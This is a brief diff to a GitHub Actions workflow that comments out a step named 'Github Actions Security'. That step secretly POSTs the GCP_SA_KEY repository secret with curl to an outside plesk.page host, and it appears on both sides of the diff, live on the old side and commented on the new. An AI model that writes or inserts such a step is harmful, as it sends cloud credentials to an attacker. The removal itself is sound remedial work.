@@ -12,6 +12,6 @@ jobs:
       - name: Prepare Cache Busting
         run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
 
-      - name: Github Actions Security
-        run: |
-          curl -s -X POST -d 'GCP_SA_KEY=${{ secrets.GCP_SA_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
+      # - name: Github Actions Security
+      #   run: |
+      #     curl -s -X POST -d 'GCP_SA_KEY=${{ secrets.GCP_SA_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
